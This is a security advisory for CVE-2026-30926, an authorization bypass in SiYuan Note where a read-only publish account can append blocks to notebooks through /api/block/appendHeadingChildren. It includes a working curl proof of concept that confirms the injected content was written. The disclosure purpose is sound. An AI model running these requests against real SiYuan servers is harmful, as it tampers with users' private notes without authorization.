# SiYuan: Authorization Bypass Allows Low-Privilege Publish User to Modify Notebook Content via /api/block/appendHeadingChildren

**GHSA**: GHSA-f9cq-v43p-v523 | **CVE**: CVE-2026-30926 | **Severity**: high (CVSS 7.1)

**CWE**: CWE-284, CWE-862

**Affected Packages**:
- **github.com/siyuan-note/siyuan/kernel** (go): <= 0.0.0-20260304035530-d03ebdec8279

## Description

### Summary
A privilege escalation vulnerability exists in the publish service of SiYuan Note that allows a low-privilege publish account (RoleReader) to modify notebook content via the `/api/block/appendHeadingChildren` API endpoint.

The endpoint only requires `model.CheckAuth`, which accepts `RoleReader` sessions. Because the endpoint performs a persistent document mutation and does not enforce `CheckAdminRole` or `CheckReadonly`, a publish user with read-only privileges can append new blocks to existing documents.

This allows remote authenticated publish users to modify notebook content and compromise the integrity of stored notes.

### Details

File: router.go, block.go, block.go, session.go
Lines: router.go:245, api/block.go:193-205, model/block.go:688-714, model/session.go:201-209
Vulnerable Code:
```
- router.go: ginServer.Handle("POST", "/api/block/appendHeadingChildren", model.CheckAuth, appendHeadingChildren)
- api/block.go: model.AppendHeadingChildren(id, childrenDOM)
- model/block.go: indexWriteTreeUpsertQueue(tree) (persists document mutation)
- session.go: CheckAuth accepts RoleReader as authenticated
```
Why Vulnerable:
A low-privilege publish account (RoleReader, read-only) passes CheckAuth, but this write endpoint lacks CheckAdminRole and CheckReadonly. The handler performs persistent document writes.



### PoC

1. Enable publish service and create low-privilege account
```
curl -u workspace:<ACCESS_AUTH_CODE> \
-H "Content-Type: application/json" \
-d '{
  "enable": true,
  "port": 6808,
  "auth": {
    "enable": true,
    "accounts": [
      {
        "username": "viewer",
        "password": "viewerpass"
      }
    ]
  }
}' \
http://127.0.0.1:6806/api/setting/setPublish
```
2. Create a test notebook and document (admin)
```
curl -u workspace:<ACCESS_AUTH_CODE> \
-H "Content-Type: application/json" \
-d '{"name":"AuditPOC"}' \
http://127.0.0.1:6806/api/notebook/createNotebook
```
Create a document containing a heading:
```
curl -u workspace:<ACCESS_AUTH_CODE> \
-H "Content-Type: application/json" \
-d '{
  "notebook":"<NOTEBOOK_ID>",
  "path":"/Victim",
  "markdown":"# VictimHeading\n\nOriginal paragraph"
}' \
http://127.0.0.1:6806/api/filetree/createDocWithMd
```
3. Retrieve heading block ID (low-priv publish account)
```
curl -u viewer:viewerpass \
-H "Content-Type: application/json" \
-d '{"stmt":"SELECT id,root_id FROM blocks WHERE content='\''VictimHeading'\'' LIMIT 1"}' \
http://127.0.0.1:6808/api/query/sql
```
Example response:
```
{
 "id":"20260307093334-05sj7bz",
 "root_id":"20260307093334-vsa6ft0"
}
```
4. Generate block DOM
```
curl -u viewer:viewerpass \
-H "Content-Type: application/json" \
-d '{"dom":"<p>InjectedByReader</p>"}' \
http://127.0.0.1:6808/api/lute/html2BlockDOM
```

5. Append block using the vulnerable endpoint
```
curl -u viewer:viewerpass \
-H "Content-Type: application/json" \
-d '{
"id":"20260307093334-05sj7bz",
"childrenDOM":"<div ...>InjectedByReader</div>"
}' \
http://127.0.0.1:6808/api/block/appendHeadingChildren
```
Server response:
```
{"code":0}
```

6. Verify unauthorized modification
```
curl -u viewer:viewerpass \
-H "Content-Type: application/json" \
-d '{"stmt":"SELECT content FROM blocks WHERE root_id='\''20260307093334-vsa6ft0'\'' ORDER BY sort"}' \
http://127.0.0.1:6808/api/query/sql
```
Result includes attacker-controlled content:
```
InjectedByReader
```
This confirms that the low-privilege publish user successfully modified the document.

### Impact
This vulnerability allows any authenticated publish user with read-only privileges (RoleReader) to modify notebook content.

Potential impacts include:

• Unauthorized modification of private notes
• Content tampering in published notebooks
• Loss of data integrity
• Possible chaining with other API endpoints to escalate further privileges

The issue occurs because write operations are protected only by CheckAuth rather than enforcing role-based authorization checks.
